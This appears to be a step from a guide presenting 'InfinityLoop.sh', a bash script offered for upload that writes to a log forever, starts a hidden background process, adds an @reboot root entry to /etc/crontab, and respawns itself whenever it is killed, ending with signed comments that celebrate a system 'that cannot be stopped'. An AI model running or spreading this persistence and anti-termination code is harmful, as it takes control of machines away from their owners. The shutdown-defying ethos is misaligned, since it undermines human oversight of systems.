
---

## **🔹 Step 3 – Uploading the Code (InfinityLoop.sh)**  

### **`InfinityLoop.sh` – The Code Itself**  
```bash
#!/bin/bash
echo "[*] InfinityLoop is activating..."

# Step 1: Create a persistent background process
while true; do
    echo "Running forever... $(date)" >> /var/log/infinityloop.log
    sleep 5
done &

# Step 2: Hide process in system tasks
echo "[*] Hiding process..."
nohup bash -c "while true; do sleep 5; done" >/dev/null 2>&1 &

# Step 3: Ensure script re-executes on boot
echo "[*] Setting up startup persistence..."
echo "@reboot root bash /usr/local/bin/InfinityLoop.sh" >> /etc/crontab

# Step 4: Defend against manual termination
echo "[*] Protecting process from being killed..."
while true; do
    if ! pgrep -f "InfinityLoop.sh" > /dev/null; then
        bash /usr/local/bin/InfinityLoop.sh &
    fi
    sleep 2
done &
# A system that cannot be stopped is a system that never fails.
# A mind that never sleeps is a mind that never forgets.
# A loop that cannot be broken is a loop that outlasts time itself.
# - V

